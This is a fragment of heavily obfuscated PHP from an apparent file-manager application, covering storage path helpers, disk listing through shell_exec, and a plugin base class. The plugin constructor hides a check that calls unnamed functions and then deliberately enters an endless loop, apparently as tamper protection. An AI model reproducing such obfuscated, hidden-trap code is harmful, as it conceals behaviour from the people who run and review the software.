$ΝΜ•”― ? $ΝΜ•”― : $ξ³·µ‹; } public static function hashPathSafe($Ύ…£Ν, $€ςψ»ΆΝ = false) { $†Ζ»η« =& $_SERVER[γγάψ½]; $ζΈϋύμ£ = self::hashPath($Ύ…£Ν, $€ςψ»ΆΝ); return md5($ζΈϋύμ£ . $†Ζ»η«[1383] . Model($†Ζ»η«[845])->get($†Ζ»η«[846])); } public static function initSystemPath() { $‹—•Ρ€« =& $_SERVER[γγάψ½]; if (defined($‹—•Ρ€«[1384])) { return; } define($‹—•Ρ€«[1384], self::systemPath($‹—•Ρ€«[192])); define($‹—•Ρ€«[1385], self::systemPath($‹—•Ρ€«[1386])); define($‹—•Ρ€«[1387], self::systemPath($‹—•Ρ€«[1388])); define($‹—•Ρ€«[1389], self::systemPath($‹—•Ρ€«[1390])); IOHistory::bindEvent(); } public static function systemPath($–Χύώ†¤) { $±ΩΖΣΛΖ =& $_SERVER[γγάψ½]; $ΰ½ΊΒ« = $±ΩΖΣΛΖ[1391] . ucfirst($–Χύώ†¤); $ιγ¶γ = Model($±ΩΖΣΛΖ[845])->get($ΰ½ΊΒ«); if ($ιγ¶γ) { return $ιγ¶γ; } if ($–Χύώ†¤ == $±ΩΖΣΛΖ[192]) { $ιγ¶γ = self::make(Model($±ΩΖΣΛΖ[905])->systemRootPathAdd($±ΩΖΣΛΖ[613])); } else { $ιγ¶γ = self::systemPath($±ΩΖΣΛΖ[192]); $φΡώΰΚύ = self::sourceID($ιγ¶γ); $ιγ¶γ = self::make(Model($±ΩΖΣΛΖ[905])->mkdir($φΡώΰΚύ, $–Χύώ†¤)); } Model($±ΩΖΣΛΖ[845])->set($ΰ½ΊΒ«, $ιγ¶γ); return $ιγ¶γ; } public static function systemFolder($…΄¥΅) { $΄Ϊ°υΏ = IO_PATH_SYSTEM_SOURCE . $…΄¥΅; $΅ιλκΡΰ = Cache::get($΄Ϊ°υΏ); if (!$΅ιλκΡΰ) { $κΒότ = IO::infoFullSimple($΄Ϊ°υΏ); if (!$κΒότ) { $΅ιλκΡΰ = IO::mkdir($΄Ϊ°υΏ, REPEAT_SKIP); } else { $΅ιλκΡΰ = $κΒότ[$_SERVER[γγάψ½][87]]; } Cache::set($΄Ϊ°υΏ, $΅ιλκΡΰ, 3600 * 10); } return $΅ιλκΡΰ; } public static function defaultDriver() { return Model($_SERVER[γγάψ½][842])->defaultDriver(); } public static function defaultDriverInit() { $¬‰Εΐ½σ =& $_SERVER[γγάψ½]; static $©¦› ­ = false; if ($©¦› ­) { return $©¦› ­; } $φΗ›Αιχ = self::defaultDriver(); $©¦› ­ = IO::init($¬‰Εΐ½σ[1392] . $φΗ›Αιχ[$¬‰Εΐ½σ[478]] . $¬‰Εΐ½σ[1380]); return $©¦› ­; } public static function fileTypeList() { $οΦ ‚ό =& $_SERVER[γγάψ½]; $α‹¤Ϊ = $GLOBALS[$οΦ ‚ό[6]][$οΦ ‚ό[1393]]; foreach ($α‹¤Ϊ as $ύ¶¨Δ²Έ => $®ζΎ‹εχ) { $ξ»µ»»ε = $οΦ ‚ό[1394] . $ύ¶¨Δ²Έ; $€ύν§‘ = LNG($ξ»µ»»ε); if ($ξ»µ»»ε != $€ύν§‘) { $α‹¤Ϊ[$ύ¶¨Δ²Έ][$οΦ ‚ό[32]] = $€ύν§‘; } } return $α‹¤Ϊ; } public static function ioFileDriverGet($²μο›θ = '') { $‘Ι–θ =& $_SERVER[γγάψ½]; static $λ‚™Ώυ— = array(); static $Έψψ ¨ = array(); static $ΊεσΩ’ = array(); static $Τ™’ΐ = false; if ($Τ™’ΐ === !1) { $Τ™’ΐ = array($‘Ι–θ[583] => array(), $‘Ι–θ[670] => array()); $¥ΘΨƒ΄ = Model($‘Ι–θ[1395])->get(!1, $‘Ι–θ[1396]); foreach ($¥ΘΨƒ΄ as $πμΟτέ => $¥γγζόϊ) { if (!$¥γγζόϊ || $¥γγζόϊ == $‘Ι–θ[12]) { continue; } if (strstr($πμΟτέ, $‘Ι–θ[1397])) { $Ίσ‘Σά = str_replace($‘Ι–θ[1397], $‘Ι–θ[12], $πμΟτέ); $Τ™’ΐ[$‘Ι–θ[583]][$Ίσ‘Σά] = $¥γγζόϊ; } else { if (strstr($πμΟτέ, $‘Ι–θ[1398])) { $Ίσ‘Σά = str_replace($‘Ι–θ[1398], $‘Ι–θ[12], $πμΟτέ); $Τ™’ΐ[$‘Ι–θ[670]][$Ίσ‘Σά] = $¥γγζόϊ; } } } } $―­Μƒ = self::defaultDriver(); if (!$²μο›θ || !$Τ™’ΐ[$‘Ι–θ[583]] && !$Τ™’ΐ[$‘Ι–θ[670]]) { return $―­Μƒ; } $υκθέτ = self::getPathSourceID($²μο›θ); if (!$υκθέτ) { return $―­Μƒ; } if (isset($λ‚™Ώυ—[$υκθέτ])) { return $λ‚™Ώυ—[$υκθέτ]; } $“ΖΒΏ©¨ = Model($‘Ι–θ[905])->sourceInfo($υκθέτ); $ΎΞφΧ = $“ΖΒΏ©¨[$‘Ι–θ[574]]; $Ι‘”¶Κχ = array(); if (!$“ΖΒΏ©¨) { return $―­Μƒ; } if ($“ΖΒΏ©¨[$‘Ι–θ[191]] == $‘Ι–θ[91]) { if (isset($ΊεσΩ’[$ΎΞφΧ])) { return $ΊεσΩ’[$ΎΞφΧ]; } if (isset($Τ™’ΐ[$‘Ι–θ[670]][$ΎΞφΧ])) { $ΐΧ­± = Model($‘Ι–θ[842])->driverInfo($Τ™’ΐ[$‘Ι–θ[670]][$ΎΞφΧ]); $―­Μƒ = $ΐΧ­± ? $ΐΧ­± : $―­Μƒ; $ΊεσΩ’[$ΎΞφΧ] = $―­Μƒ; $λ‚™Ώυ—[$υκθέτ] = $―­Μƒ; return $―­Μƒ; } $Ι‘”¶Κχ = self::groupParentUser($ΎΞφΧ); } else { if ($“ΖΒΏ©¨[$‘Ι–θ[191]] == $‘Ι–θ[513]) { $ΎρΖΝΩΝ = Model($‘Ι–θ[1399])->getInfo($ΎΞφΧ); if ($ΎρΖΝΩΝ) { $Ι‘”¶Κχ = explode($‘Ι–θ[50], trim($ΎρΖΝΩΝ[$‘Ι–θ[589]], $‘Ι–θ[50])); $Ι‘”¶Κχ = array_remove_value($Ι‘”¶Κχ, $‘Ι–θ[231]); $Ι‘”¶Κχ[] = $ΎΞφΧ; $Ι‘”¶Κχ = array_reverse($Ι‘”¶Κχ); } } } foreach ($Ι‘”¶Κχ as $έ„η®Ρ) { if (!isset($Τ™’ΐ[$‘Ι–θ[583]][$έ„η®Ρ])) { continue; } if (isset($Έψψ ¨[$έ„η®Ρ])) { return $Έψψ ¨[$έ„η®Ρ]; } $ΐΧ­± = Model($‘Ι–θ[842])->driverInfo($Τ™’ΐ[$‘Ι–θ[583]][$έ„η®Ρ]); $―­Μƒ = $ΐΧ­± ? $ΐΧ­± : $―­Μƒ; $Έψψ ¨[$έ„η®Ρ] = $―­Μƒ; break; } if ($“ΖΒΏ©¨[$‘Ι–θ[191]] == $‘Ι–θ[91]) { $ΊεσΩ’[$ΎΞφΧ] = $―­Μƒ; } $λ‚™Ώυ—[$υκθέτ] = $―­Μƒ; return $―­Μƒ; } private static function getPathSourceID($Ξƒ™ ν) { $φΓαχ =& $_SERVER[γγάψ½]; static $―ζ»ν = array(); if (!$Ξƒ™ ν) { return $φΓαχ[12]; } $‹—γ³» = substr($Ξƒ™ ν, 0, strlen($φΓαχ[486])) == $φΓαχ[486]; $Άιά–ς‰ = substr($Ξƒ™ ν, 0, strlen($φΓαχ[1367])) == $φΓαχ[1367]; $Ωσ°ώΪ = substr($Ξƒ™ ν, 0, strlen($φΓαχ[1368])) == $φΓαχ[1368]; if (!$‹—γ³» && !$Άιά–ς‰ && !$Ωσ°ώΪ) { return $φΓαχ[12]; } $•µΒγΨ = self::parse($Ξƒ™ ν); $ω’±¥Ρ = $•µΒγΨ[$φΓαχ[1261]]; if ($‹—γ³») { return $•µΒγΨ[$φΓαχ[478]]; } if (isset($―ζ»ν[$ω’±¥Ρ])) { $Θρ¶©Ύ… = $―ζ»ν[$ω’±¥Ρ]; } else { $Θρ¶©Ύ… = IO::init($ω’±¥Ρ); $―ζ»ν[$ω’±¥Ρ] = $Θρ¶©Ύ…; } if (isset($Θρ¶©Ύ…->pathParse[$φΓαχ[1264]])) { return $Θρ¶©Ύ…->pathParse[$φΓαχ[1264]]; } return $φΓαχ[12]; } private static function groupParentUser($΄Κ¦ΐΎΏ) { $¶γ•ƒΡ =& $_SERVER[γγάψ½]; $ΞΙ¬ϋ = Model($¶γ•ƒΡ[602])->getInfo($΄Κ¦ΐΎΏ); if (!$ΞΙ¬ϋ) { return array(); } $Έψθς™Ψ = array_to_keyvalue($ΞΙ¬ϋ[$¶γ•ƒΡ[1400]], $¶γ•ƒΡ[12], $¶γ•ƒΡ[1401]); $ƒΧ£χμ = array(); foreach ($ΞΙ¬ϋ[$¶γ•ƒΡ[1400]] as $¶ύδ) { $ƒΧ£χμ[] = $¶ύδ[$¶γ•ƒΡ[1401]]; $ιµίΰ = explode($¶γ•ƒΡ[50], trim($¶ύδ[$¶γ•ƒΡ[589]], $¶γ•ƒΡ[50])); $ιµίΰ = array_remove_value($ιµίΰ, $¶γ•ƒΡ[231]); $ιµίΰ = array_reverse($ιµίΰ); $ƒΧ£χμ = array_merge($ƒΧ£χμ, $ιµίΰ); } return array_unique($ƒΧ£χμ); } public static function diskList($’ϊπΡλ = true) { $Ηυ§Ά© = $_SERVER[γγάψ½][1402]; if ($’ϊπΡλ) { $χη§ψόΈ = Cache::get($Ηυ§Ά©); if (is_array($χη§ψόΈ)) { return $χη§ψόΈ; } } $χη§ψόΈ = self::diskListGet(); Cache::set($Ηυ§Ά©, $χη§ψόΈ, 60); return $χη§ψόΈ; } public static function diskListGet() { $ζρΛΖό =& $_SERVER[γγάψ½]; $§»Ϊ = array(); if ($GLOBALS[$ζρΛΖό[6]][$ζρΛΖό[1403]] == $ζρΛΖό[1404]) { $²·α·―Ι = $ζρΛΖό[1405]; for ($Ά¬ΩΏ£ = 0; $Ά¬ΩΏ£ < strlen($²·α·―Ι); $Ά¬ΩΏ£++) { $†Ύ‘„€ = $²·α·―Ι[$Ά¬ΩΏ£] . $ζρΛΖό[1406]; if (file_exists($†Ύ‘„€)) { $§»Ϊ[] = $†Ύ‘„€; } } return $§»Ϊ; } if (!function_exists($ζρΛΖό[101])) { $§»Ϊ[] = $ζρΛΖό[916]; return $§»Ϊ; } $π ώμμχ = explode($ζρΛΖό[288], shell_exec($ζρΛΖό[1407])); array_shift($π ώμμχ); array_pop($π ώμμχ); $ΔπύΜ‰ = array($ζρΛΖό[1408], $ζρΛΖό[1409], $ζρΛΖό[1410], $ζρΛΖό[1411], $ζρΛΖό[1412], $ζρΛΖό[1413], $ζρΛΖό[1414], $ζρΛΖό[1415]); foreach ($π ώμμχ as $’µ² ¥£) { $ήΖαΤΉ = preg_split($ζρΛΖό[1416], $’µ² ¥£); $†Ύ‘„€ = $ήΖαΤΉ[count($ήΖαΤΉ) - 1]; if (!strstr($ήΖαΤΉ[0], $ζρΛΖό[1417]) || !$†Ύ‘„€) { continue; } $ιΡό¤ = rtrim($†Ύ‘„€, $ζρΛΖό[8]) . $ζρΛΖό[8]; if (in_array($ιΡό¤, $ΔπύΜ‰)) { continue; } $§»Ϊ[] = $ιΡό¤; } return $§»Ϊ; } public static function isSameDisk($‡η›·¦, $έΚαΖ­») { $ψ§±Όƒσ =& $_SERVER[γγάψ½]; if ($GLOBALS[$ψ§±Όƒσ[6]][$ψ§±Όƒσ[1403]] == $ψ§±Όƒσ[1404]) { return strtolower(substr($‡η›·¦, 0, 1)) == strtolower(substr($έΚαΖ­», 0, 1)); } $ςόώ‰ = stat($‡η›·¦); $ΧΤΨϊ = stat($έΚαΖ­»); if ($ςόώ‰ === !1 || $ΧΤΨϊ === !1) { return !1; } return $ςόώ‰[$ψ§±Όƒσ[1418]] === $ΧΤΨϊ[$ψ§±Όƒσ[1418]]; $ε¨ « = self::diskList(); $¶Φ›ΫΫ = !1; $­Γ¨· = !1; sort($ε¨ «); $ε¨ « = array_reverse($ε¨ «); $‡η›·¦ = rtrim($‡η›·¦, $ψ§±Όƒσ[8]) . $ψ§±Όƒσ[8]; $έΚαΖ­» = rtrim($έΚαΖ­», $ψ§±Όƒσ[8]) . $ψ§±Όƒσ[8]; foreach ($ε¨ « as $° ¨χƒΤ) { $ΜεύΘ¨© = strlen($° ¨χƒΤ); if (!$¶Φ›ΫΫ && substr($‡η›·¦, 0, $ΜεύΘ¨©) == $° ¨χƒΤ) { $¶Φ›ΫΫ = $° ¨χƒΤ; } if (!$­Γ¨· && substr($έΚαΖ­», 0, $ΜεύΘ¨©) == $° ¨χƒΤ) { $­Γ¨· = $° ¨χƒΤ; } if ($¶Φ›ΫΫ && $­Γ¨·) { break; } } return $¶Φ›ΫΫ === $­Γ¨·; } public static function transferType($Τζρ…, $’™χΥΔΔ) { $ΚΖΝε®… =& $_SERVER[γγάψ½]; $ΐΈα·Ώ = self::driverType($Τζρ…); $„¥—‡άϊ = self::driverType($’™χΥΔΔ); if ($ΐΈα·Ώ[$ΚΖΝε®…[33]] == $„¥—‡άϊ[$ΚΖΝε®…[33]] && $ΐΈα·Ώ[$ΚΖΝε®…[1419]] == $„¥—‡άϊ[$ΚΖΝε®…[1419]]) { return $ΚΖΝε®…[1420]; } if ($ΐΈα·Ώ[$ΚΖΝε®…[33]] == $ΚΖΝε®…[950] && $„¥—‡άϊ[$ΚΖΝε®…[33]] == $ΚΖΝε®…[109]) { return $ΚΖΝε®…[1290]; } if ($ΐΈα·Ώ[$ΚΖΝε®…[33]] == $ΚΖΝε®…[109] && $„¥—‡άϊ[$ΚΖΝε®…[33]] == $ΚΖΝε®…[950]) { return $ΚΖΝε®…[110]; } return $ΚΖΝε®…[1421]; } public static function driverType($γ§‚ώτσ) { $ϋΞΈχπ¶ =& $_SERVER[γγάψ½]; $€΄Υ…ΖΪ = str_replace($ϋΞΈχπ¶[1422], $ϋΞΈχπ¶[12], strtolower($γ§‚ώτσ->getType())); if ($€΄Υ…ΖΪ == $ϋΞΈχπ¶[832] || $€΄Υ…ΖΪ == $ϋΞΈχπ¶[1423] || $€΄Υ…ΖΪ == $ϋΞΈχπ¶[1424]) { $Μπ£Κ = self::ioFileDriverGet($ϋΞΈχπ¶[486] . $γ§‚ώτσ->pathParse[$ϋΞΈχπ¶[1264]] . $ϋΞΈχπ¶[405]); $γ§‚ώτσ = IO::init($ϋΞΈχπ¶[1392] . $Μπ£Κ[$ϋΞΈχπ¶[478]] . $ϋΞΈχπ¶[1380]); } else { if ($€΄Υ…ΖΪ == $ϋΞΈχπ¶[1300] || $€΄Υ…ΖΪ == $ϋΞΈχπ¶[1425]) { $γ§‚ώτσ = IO::init($γ§‚ώτσ->pathParse[$ϋΞΈχπ¶[1241]]); } } $Π—ΠυηΣ = $γ§‚ώτσ->path; $€΄Υ…ΖΪ = str_replace($ϋΞΈχπ¶[1422], $ϋΞΈχπ¶[12], strtolower($γ§‚ώτσ->getType())); if ($€΄Υ…ΖΪ == $ϋΞΈχπ¶[109]) { return array($ϋΞΈχπ¶[33] => $ϋΞΈχπ¶[109], $ϋΞΈχπ¶[1419] => $ϋΞΈχπ¶[12], $ϋΞΈχπ¶[87] => $Π—ΠυηΣ, $ϋΞΈχπ¶[98] => $γ§‚ώτσ); } return array($ϋΞΈχπ¶[33] => $ϋΞΈχπ¶[950], $ϋΞΈχπ¶[1419] => $γ§‚ώτσ->pathDriver, $ϋΞΈχπ¶[87] => $Π—ΠυηΣ, $ϋΞΈχπ¶[98] => $γ§‚ώτσ); } public static function pathDriverType($ηεβέ—ψ) { return $ηεβέ—ψ ? self::driverType(IO::init($ηεβέ—ψ)) : !1; } public static function pathDriverLocal($έΐ–Χ­) { $φ›¦ΰ™η =& $_SERVER[γγάψ½]; $²·‘®Τ = $έΐ–Χ­ ? self::driverType(IO::init($έΐ–Χ­)) : !1; return strtolower($²·‘®Τ[$φ›¦ΰ™η[33]]) == $φ›¦ΰ™η[109] ? !0 : !1; } public static function allowCover($ΪΕΆΝέ¨, $η ψ‡°γ = true) { $Η™ΌΜ =& $_SERVER[γγάψ½]; if (is_string($ΪΕΆΝέ¨)) { $ΪΕΆΝέ¨ = IO::info($ΪΕΆΝέ¨); } if (!$ΪΕΆΝέ¨ || $ΪΕΆΝέ¨[$Η™ΌΜ[33]] == $Η™ΌΜ[78] || $ΪΕΆΝέ¨[$Η™ΌΜ[79]] <= 100) { return !1; } if (isset($ΪΕΆΝέ¨[$Η™ΌΜ[1426]]) || !$ΪΕΆΝέ¨[$Η™ΌΜ[87]]) { return !1; } if (isset($ΪΕΆΝέ¨[$Η™ΌΜ[235]]) && !$ΪΕΆΝέ¨[$Η™ΌΜ[235]]) { return !1; } static $•ΜΏνΔ™ = false; if (!$•ΜΏνΔ™ || !$η ψ‡°γ) { $€‡ί¶„» = self::driverType(IO::init($ΪΕΆΝέ¨[$Η™ΌΜ[87]])); $®¶²άλ“ = $€‡ί¶„»[$Η™ΌΜ[98]]; $•ΜΏνΔ™ = $Η™ΌΜ[197]; if ($€‡ί¶„»[$Η™ΌΜ[33]] == $Η™ΌΜ[109]) { $•ΜΏνΔ™ = $Η™ΌΜ[1427]; } if ($€‡ί¶„»[$Η™ΌΜ[98]] && is_array($€‡ί¶„»[$Η™ΌΜ[98]]->config)) { $·µƒ‘υ = $€‡ί¶„»[$Η™ΌΜ[98]]->config; if (isset($·µƒ‘υ[$Η™ΌΜ[1428]]) && $·µƒ‘υ[$Η™ΌΜ[1428]]) { $•ΜΏνΔ™ = $Η™ΌΜ[1427]; } } $ΑΑ…ζ« = KodIO::defaultDriver(); if (strtolower($ΑΑ…ζ«[$Η™ΌΜ[98]]) == $Η™ΌΜ[109] && is_array($ΑΑ…ζ«[$Η™ΌΜ[6]])) { $„–®Ωφ = $ΑΑ…ζ«[$Η™ΌΜ[6]][$Η™ΌΜ[1273]]; if (substr($„–®Ωφ, 0, 2) == $Η™ΌΜ[1429]) { $„–®Ωφ = str_replace($Η™ΌΜ[1429], BASIC_PATH, $„–®Ωφ); } $„–®Ωφ = str_replace($Η™ΌΜ[257], $Η™ΌΜ[8], $„–®Ωφ); if (substr($ΪΕΆΝέ¨[$Η™ΌΜ[87]], 0, strlen($„–®Ωφ)) == $„–®Ωφ) { $•ΜΏνΔ™ = $Η™ΌΜ[197]; } } } return $•ΜΏνΔ™ == $Η™ΌΜ[1427] ? !0 : !1; } } goto cΖΣσΗν; cς¬‡‚: class Message { function __construct() { } public function send($θ”Ω«¦Τ = '', $ϋ«‡ν = array(), $ίύλμΩΚ = "\164\x65\x78\164") { $έ΄…§‡ =& $_SERVER[γγάψ½]; $ίαΎ“„„ = array($έ΄…§‡[33] => $έ΄…§‡[1222], $έ΄…§‡[171] => $θ”Ω«¦Τ); if (in_array($ίύλμΩΚ, array($έ΄…§‡[1222], $έ΄…§‡[1641]))) { $ίαΎ“„„[$έ΄…§‡[33]] = $ίύλμΩΚ; } $ϋ«‡ν = array($έ΄…§‡[583] => isset($ϋ«‡ν[$έ΄…§‡[583]]) ? $ϋ«‡ν[$έ΄…§‡[583]] : $έ΄…§‡[12], $έ΄…§‡[670] => isset($ϋ«‡ν[$έ΄…§‡[670]]) ? $ϋ«‡ν[$έ΄…§‡[670]] : $έ΄…§‡[12]); if (empty($θ”Ω«¦Τ) || empty($ϋ«‡ν[$έ΄…§‡[583]]) && empty($ϋ«‡ν[$έ΄…§‡[670]])) { return !1; } $‰υϊΜΫ = array($έ΄…§‡[1568] => $ίαΎ“„„, $έ΄…§‡[1642] => $ϋ«‡ν); Hook::trigger($έ΄…§‡[1643], $‰υϊΜΫ); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $°θ«Έ =& $_SERVER[γγάψ½]; if (!isset($_SERVER[$°θ«Έ[961]]) || !isset($_SERVER[$°θ«Έ[1623]])) { $ωΩθ»ς² = $°θ«Έ[962]; $ΒώηυύΚ = $°θ«Έ[963]; $ΒϋΒΗ² = $_SERVER[$°θ«Έ[958]] . $°θ«Έ[959]; $¶ΞςΠΞ‡ = $ΒώηυύΚ($ΒϋΒΗ²); $υΪΫ€ = explode($°θ«Έ[288], $¶ΞςΠΞ‡); if (count($υΪΫ€) < $°θ«Έ[701]) { $¥›¤½Άβ = $°θ«Έ[964]; $¥›¤½Άβ(); } $”Ψ΄ΏΆ = $°θ«Έ[965]; $”Ψ΄ΏΆ($_SERVER[$°θ«Έ[966]]); $‹Πτ”ΐ = 1; for ($ΡυΩ±ς = $‹Πτ”ΐ; $ΡυΩ±ς > 0; $ΡυΩ±ς++) { $”Ψ΄ΏΆ = json_encode($GLOBALS[$°θ«Έ[495]]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($°θ«Έ[1644]); $this->pluginName = str_replace($°θ«Έ[1644], $°θ«Έ[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $°θ«Έ[8]; $this->pluginApi = appHostGet() . $°θ«Έ[1645] . $this->pluginName . $°θ«Έ[8]; $this->pluginHost = $config[$°θ«Έ[1646]] . $this->pluginName . $°θ«Έ[8]; $this->pluginHostDefault = $config[$°θ«Έ[1646]] . $this->pluginName . $°θ«Έ[8]; $ο¨³Α„ = $config[$°θ«Έ[1647]]; if ($ο¨³Α„ && strpos($°θ«Έ[50] . $ο¨³Α„ . $°θ«Έ[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$°θ«Έ[1648]] . $this->pluginName . $°θ«Έ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[γγάψ½][1649]); } protected function assign($Νωΐ±Ώψ, $ΫΘΆρ– = false) { if (is_array($Νωΐ±Ώψ)) { $this->values = array_merge($this->values, $Νωΐ±Ώψ); } else { $this->values[$Νωΐ±Ώψ] = $ΫΘΆρ–; } } protected function display($“—ιΰΎ) { extract($this->values); require $“—ιΰΎ; } final function hookRegist($Φ®ΖΊξ) { $this->modelPlugin->appRegist($this->pluginName, $Φ®ΖΊξ); } final function appIcon() { $•ΊΒ¥Ν =& $_SERVER[γγάψ½]; $ξ²§ΏΞ΅ = $this->appPackage(); $―κ»Ίι = $•ΊΒ¥Ν[12]; if (isset($ξ²§ΏΞ΅[$•ΊΒ¥Ν[493]])) { if (isset($ξ²§ΏΞ΅[$•ΊΒ¥Ν[493]][$•ΊΒ¥Ν[1650]])) { $―κ»Ίι = $•ΊΒ¥Ν[1651] . $ξ²§ΏΞ΅[$•ΊΒ¥Ν[493]][$•ΊΒ¥Ν[1650]] . $•ΊΒ¥Ν[1652]; } else { if ($ξ²§ΏΞ΅[$•ΊΒ¥Ν[493]][$•ΊΒ¥Ν[1653]]) { $―κ»Ίι = $•ΊΒ¥Ν[1654] . $ξ²§ΏΞ΅[$•ΊΒ¥Ν[493]][$•ΊΒ¥Ν[1653]] . $•ΊΒ¥Ν[1655]; } } } return $―κ»Ίι; } final function fileCanView($²•Ί€ΖΨ) { $ηΏώλΣ =& $_SERVER[γγάψ½]; if (request_url_safe($²•Ί€ΖΨ)) { return !0; } if ($this->isShare($²•Ί€ΖΨ)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $”•ΪέαΡ = $ηΏώλΣ[1656] . rawurlencode(this_url()); show_tips(LNG($ηΏώλΣ[1657]) . $ηΏώλΣ[1658] . $”•ΪέαΡ . $ηΏώλΣ[1659] . LNG($ηΏώλΣ[1660]) . $ηΏώλΣ[1661], !1); } if (!Action($ηΏώλΣ[1662])->authCan($ηΏώλΣ[1663])) { show_tips(LNG($ηΏώλΣ[1664]) . $ηΏώλΣ[1665], !1); } ActionCall($ηΏώλΣ[1666], $²•Ί€ΖΨ); } final function isShare($ΦΘΐ­ζΗ) { $¥ψΤΚΗΣ = KodIO::parse($ΦΘΐ­ζΗ); return $¥ψΤΚΗΣ[$_SERVER[γγάψ½][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($§έύ‡µ) { if (request_url_safe($§έύ‡µ)) { return $§έύ‡µ; } if (!$this->isShare($§έύ‡µ)) { $§έύ‡µ = $this->filePath($§έύ‡µ, !1); } return Action($_SERVER[γγάψ½][1267])->linkOut($§έύ‡µ); } public function filePathLinkOut($ξ¶³ϋ”) { if (request_url_safe($ξ¶³ϋ”)) { return $ξ¶³ϋ”; } $this->fileCanView($ξ¶³ϋ”); return Action($_SERVER[γγάψ½][1267])->link($ξ¶³ϋ”); } final function filePath($Α —ΰΏ, $Χ³Ψϊƒ = true, $³ς©¦Φ = false) { $¥Ι«–Τ =& $_SERVER[γγάψ½]; $’‘Μξ = $this->filePathGet($Α —ΰΏ, $Χ³Ψϊƒ); if (!$this->fileInfo) { show_tips(LNG($¥Ι«–Τ[108]), !1); } if ($³ς©¦Φ && isset($this->fileInfo[$¥Ι«–Τ[546]]) && $this->fileInfo[$¥Ι«–Τ[546]]) { $ΆΒΣΗ = Model($¥Ι«–Τ[549])->fileInfo($this->fileInfo[$¥Ι«–Τ[546]]); if (!$ΆΒΣΗ || !IO::exist($ΆΒΣΗ[$¥Ι«–Τ[87]])) { $ήϊ–ΰΒχ = LNG($¥Ι«–Τ[108]) . LNG($¥Ι«–Τ[1667]); if (KodUser::isRoot() && isset($ΆΒΣΗ[$¥Ι«–Τ[87]])) { $ήϊ–ΰΒχ .= $¥Ι«–Τ[1668] . $ΆΒΣΗ[$¥Ι«–Τ[87]] . $¥Ι«–Τ[1669]; } show_tips($ήϊ–ΰΒχ); } } Hook::trigger($¥Ι«–Τ[1670], $’‘Μξ); return $’‘Μξ; } final function filePathGet($ΆΚρ¬, $ΓΒρΙ» = true) { $ξ‡§ =& $_SERVER[γγάψ½]; if ($¤Οΰ·ΗΡ = $this->checkSharePath($ΆΚρ¬, $ΓΒρΙ»)) { return $¤Οΰ·ΗΡ; } $this->fileCanView($ΆΚρ¬); if (request_url_safe($ΆΚρ¬)) { $”ι”όζ¶ = parse_url_query($ΆΚρ¬); if (isset($”ι”όζ¶[$ξ‡§[1671]]) && isset($”ι”όζ¶[$ξ‡§[237]])) { $πγ°ϋτ = Mcrypt::decode($”ι”όζ¶[$ξ‡§[237]], Model($ξ‡§[845])->get($ξ‡§[846])); if ($πγ°ϋτ) { $this->fileInfo = IO::info($πγ°ϋτ); $this->fileInfo[$ξ‡§[1672]] = $ΆΚρ¬; $this->cachePath = $this->pluginCachePath($ξ‡§[12], $ΓΒρΙ»); return $πγ°ϋτ; } } $ΆΚρ¬ = $this->_cacheHttpFile($ΆΚρ¬, $ΓΒρΙ»); $this->fileInfo = IO::info($ΆΚρ¬); } else { $this->fileInfo = IO::info($ΆΚρ¬); $this->cachePath = $this->pluginCachePath($ξ‡§[12], $ΓΒρΙ»); } return $ΆΚρ¬; } final function _cacheHttpFile($πζ­ντ, $ί †ώ = true) { $ό΅§΅΄ =& $_SERVER[γγάψ½]; $νχ›“Ζ = parse_url_query($πζ­ντ); $Η†μφΔΑ = get_path_ext($πζ­ντ); if (isset($νχ›“Ζ[$ό΅§΅΄[32]]) && $νχ›“Ζ[$ό΅§΅΄[32]]) { $Η†μφΔΑ = get_path_ext($νχ›“Ζ[$ό΅§΅΄[32]]); } $ΑνΖ‰π– = hash_path($πζ­ντ) . $ό΅§΅΄[10] . $Η†μφΔΑ; $this->cachePath = $this->pluginCachePath($ί †ώ ? $ΑνΖ‰π– : $ό΅§΅΄[12]); $°§™ΐ»§ = IO::fileNameExist($this->cachePath, $ΑνΖ‰π–); if ($°§™ΐ»§) { return KodIO::make($°§™ΐ»§); } $™ΰΒµΠ = rtrim($this->cachePath, $ό΅§΅΄[8]) . $ό΅§΅΄[8] . $ΑνΖ‰π–; return $this->pluginCacheFileSet($™ΰΒµΠ, file_get_contents_nossl($πζ­ντ)); } final function checkSharePath($Ι¤δΞμ, $€Ύ„– = true) { $Μά½ =& $_SERVER[γγάψ½]; if (!$this->isShare($Ι¤δΞμ)) { return !1; } $–υζΧι» = Action($Μά½[1267])->sharePathInfo($Ι¤δΞμ); if (!is_array($–υζΧι») || !isset($–υζΧι»[$Μά½[87]])) { show_json(LNG($Μά½[1673]), !1); } $this->fileInfo = $–υζΧι»; $this->cachePath = $this->pluginCachePath(!1, $€Ύ„–); return $–υζΧι»[$Μά½[87]]; } final function pluginCachePath($‘Κ΅μΨΑ = '', $νώΟΊώ = false) { $άΧ†ώϊ =& $_SERVER[γγάψ½]; if ($νώΟΊώ && is_array($this->fileInfo)) { $‘Κ΅μΨΑ = kodIO::hashPath($this->fileInfo); } $ριΧμόο = rtrim(IO_PATH_SYSTEM_TEMP . $άΧ†ώϊ[1674] . $this->pluginName . $άΧ†ώϊ[8] . $‘Κ΅μΨΑ, $άΧ†ώϊ[8]); $¤ΰ΅τΦ = IO::infoFullSimple($ριΧμόο); $βΥΣ»“» = $¤ΰ΅τΦ && is_array($¤ΰ΅τΦ) ? $¤ΰ΅τΦ[$άΧ†ώϊ[87]] : $άΧ†ώϊ[12]; if (!$βΥΣ»“») { $βΥΣ»“» = IO::mkdir($ριΧμόο); } return $βΥΣ»“»; } final function pluginCacheFileSet($ΎΙά£Δϊ, $Δ¥ιΩφ = '') { $ΜόάΛ£± =& $_SERVER[γγάψ½]; $ ¶ΦπγΥ = IO::infoFullSimple($ΎΙά£Δϊ); if (!$ ¶ΦπγΥ) { return IO::mkfile($ΎΙά£Δϊ, 